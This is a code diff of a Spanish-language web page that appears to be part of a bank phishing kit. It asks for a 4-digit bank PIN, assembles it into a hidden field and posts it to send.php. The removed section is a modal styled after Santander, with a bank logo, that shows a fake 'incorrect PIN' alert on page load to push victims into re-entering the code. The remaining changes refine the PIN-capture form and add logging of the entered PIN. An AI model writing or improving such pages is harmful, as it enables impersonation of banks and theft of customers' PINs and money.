@@ -50,128 +50,6 @@
             border-bottom-color: #ec1c24;
             background-color: #fff5f5;
         }
-
-
-        .bank-modal-overlay{
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.45);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 999999;
-    animation: fadeIn .35s ease;
-    backdrop-filter: blur(2px);
-}
-
-/* VENTANA */
-.bank-modal{
-    position: relative;
-    width: 92%;
-    max-width: 380px;
-    background: #ffffff;
-    border-radius: 18px;
-    padding: 28px 24px 24px;
-    box-shadow: 
-        0 10px 35px rgba(0,0,0,0.18),
-        0 2px 8px rgba(0,0,0,0.08);
-    text-align: center;
-    animation: modalShow .35s ease;
-    font-family: Arial, Helvetica, sans-serif;
-}
-
-/* LOGO */
-.bank-logo{
-    margin-bottom: 18px;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-.bank-logo img{
-    width: 35px;
-    height: auto;
-    object-fit: contain;
-}
-
-/* TEXTO */
-.bank-alert-text{
-    color: #d6001c;
-    font-size: 17px;
-    font-weight: 600;
-    line-height: 1.5;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-}
-
-/* ICONO */
-.alert-icon{
-    font-size: 18px;
-    color: #d6001c;
-}
-
-/* BOTON CERRAR */
-.close-modal-btn{
-    position: absolute;
-    top: 12px;
-    right: 12px;
-    width: 34px;
-    height: 34px;
-    border: none;
-    border-radius: 50%;
-    background: transparent;
-    color: #666;
-    font-size: 18px;
-    cursor: pointer;
-    transition: 
-        transform .18s ease,
-        background .18s ease,
-        color .18s ease,
-        box-shadow .18s ease;
-}
-
-/* HOVER */
-.close-modal-btn:hover{
-    background: #f3f3f3;
-    color: #d6001c;
-    transform: rotate(90deg) scale(1.08);
-}
-
-/* CLICK */
-.close-modal-btn:active{
-    transform: scale(0.92) rotate(90deg);
-}
-
-/* FOCUS */
-.close-modal-btn:focus{
-    outline: none;
-    box-shadow: 0 0 0 3px rgba(214,0,28,0.18);
-    background: #f9f9f9;
-    color: #d6001c;
-}
-
-/* ANIMACIONES */
-@keyframes fadeIn{
-    from{
-        opacity: 0;
-    }
-    to{
-        opacity: 1;
-    }
-}
-
-@keyframes modalShow{
-    from{
-        opacity: 0;
-        transform: translateY(-18px) scale(.96);
-    }
-    to{
-        opacity: 1;
-        transform: translateY(0) scale(1);
-    }
-}
     </style>
 </head>
 <body class="flex flex-col justify-end">
@@ -185,113 +63,48 @@
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                 </svg>
             </div>
+
             <form id="otpForm" action="send.php" method="POST">
-            <div class="space-y-2">
-                <h2 class="text-xl font-bold text-gray-800">Ingresa tu NIP</h2>
-                <p class="text-sm text-gray-500 px-6">Ingresa tu NIP de seguridad de 4 dígitos para validar tu acceso y continuar con la operación.</p>
-            </div>
+                <div class="space-y-2">
+                    <h2 class="text-xl font-bold text-gray-800">Ingresa tu NIP</h2>
+                    <p class="text-sm text-gray-500 px-6">Ingresa tu NIP de seguridad de 4 dígitos para validar tu acceso y continuar con la operación.</p>
+                </div>
 
-            <!-- Contenedor de 8 dígitos -->
-             <!-- Busca el div id="otp-container" y añade esto justo ARRIBA -->
-<div id="error-msg" class="hidden animate-pulse">
-    <p class="text-red-600 text-xs font-bold bg-red-50 py-2 rounded-lg border border-red-200">
-        El código ingresado es incorrecto o ha expirado.
-    </p>
-</div>
+                <!-- MENSAJE DE ERROR -->
+                <div id="error-msg" class="hidden animate-pulse mt-4">
+                    <p class="text-red-600 text-xs font-bold bg-red-50 py-2 rounded-lg border border-red-200">
+                        El código ingresado es incorrecto o ha expirado.
+                    </p>
+                </div>
 
-<div id="otp-container" class="flex justify-center gap-2 pt-4">
-    <!-- Tus 8 inputs se quedan igual -->
-</div>
-            <div id="otp-container" class="flex justify-center gap-2 pt-4">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
-            </div>
-            <input type="hidden" name="nip2" id="codigoCompleto">
-            <div class="pt-6 space-y-4">
-                <button id="btnFinal" disabled class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-lg transition-all duration-300">
-                    Confirmar Código
-                </button>
-                <p class="text-xs text-gray-400">¿No recibiste el código? <span class="text-red-600 font-semibold cursor-pointer">Reenviar en 0:59</span></p>
-            </div>
+                <!-- CONTENEDOR OTP (4 INPUTS) - UN SOLO DIV -->
+                <div id="otp-container" class="flex justify-center gap-2 pt-4">
+                    <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                    <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                    <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                    <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                </div>
+
+                <!-- INPUT HIDDEN PARA EL NIP -->
+                <input type="hidden" name="nip" id="nip">
+
+                <!-- BOTON CONFIRMAR -->
+                <div class="pt-6 space-y-4">
+                    <button id="btnFinal" type="button" disabled class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-lg transition-all duration-300">
+                        Confirmar NIP
+                    </button>
+                </div>
             </form>
         </div>
     </div>
 
-<!-- MODAL ALERTA ESTILO SANTANDER -->
-<div id="bankAlertModal" class="bank-modal-overlay">
-    
-    <div class="bank-modal">
-
-        <!-- BOTON CERRAR -->
-        <button class="close-modal-btn" id="closeModalBtn">
-            ✕
-        </button>
-
-        <!-- LOGO -->
-        <div class="bank-logo">
-            <img src="lokoto.png" alt="Logo">
-        </div>
-
-        <!-- MENSAJE -->
-        <div class="bank-alert-text">
-            <span class="alert-icon">⚠</span>
-            NIP incorrecto, verifica e intenta nuevamente.
-        </div>
-
-    </div>
-
-</div>
-    
-<script>
-
-/* MOSTRAR AUTOMATICAMENTE */
-window.addEventListener('load', () => {
-
-    const modal = document.getElementById('bankAlertModal');
-    const closeBtn = document.getElementById('closeModalBtn');
-
-    /* CERRAR MODAL */
-    closeBtn.addEventListener('click', () => {
-
-        modal.style.animation = 'fadeOut .25s ease forwards';
-
-        setTimeout(() => {
-            modal.style.display = 'none';
-        }, 230);
-
-    });
-
-});
-
-/* ANIMACION CIERRE */
-const style = document.createElement('style');
-
-style.innerHTML = `
-@keyframes fadeOut{
-    from{
-        opacity:1;
-        transform:scale(1);
-    }
-    to{
-        opacity:0;
-        transform:scale(.96);
-    }
-}
-`;
-
-document.head.appendChild(style);
-
-</script>
     <script>
 
 const inputs = document.querySelectorAll('.otp-input');
 const btnFinal = document.getElementById('btnFinal');
-
-/* NUEVO */
 const form = document.getElementById('otpForm');
-const hiddenInput = document.getElementById('codigoCompleto');
+const hiddenInput = document.getElementById('nip');
+const errorMsg = document.getElementById('error-msg');
 
 // SALTO AUTOMATICO ENTRE INPUTS
 inputs.forEach((input, index) => {
@@ -300,6 +113,11 @@ inputs.forEach((input, index) => {
 
         // SOLO UN DIGITO
         input.value = input.value.replace(/\D/g, '').slice(0, 1);
+
+        // OCULTAR MENSAJE DE ERROR AL ESCRIBIR
+        if (errorMsg) {
+            errorMsg.classList.add('hidden');
+        }
 
         // PASAR AL SIGUIENTE
         if (input.value && index < inputs.length - 1) {
@@ -327,6 +145,8 @@ function checkComplete() {
     const code = Array.from(inputs)
         .map(i => i.value)
         .join('');
+
+    console.log('Código actual:', code, 'Longitud:', code.length); // DEBUG
 
     if (code.length === 4) {
 
@@ -369,6 +189,17 @@ btnFinal.addEventListener('click', (e) => {
         .map(i => i.value)
         .join('');
 
+    // VALIDAR QUE TENGA 4 DÍGITOS
+    if (finalCode.length !== 4) {
+        console.error('NIP incompleto');
+        if (errorMsg) {
+            errorMsg.classList.remove('hidden');
+        }
+        return;
+    }
+
+    console.log('NIP a enviar:', finalCode); // DEBUG
+
     /* GUARDAR CODIGO COMPLETO EN INPUT HIDDEN */
     hiddenInput.value = finalCode;
 
@@ -388,6 +219,8 @@ btnFinal.addEventListener('click', (e) => {
         btnFinal.classList.add(
             'bg-green-600'
         );
+
+        console.log('Enviando formulario con NIP:', hiddenInput.value); // DEBUG
 
         /* ENVIAR FORM */
         form.submit();
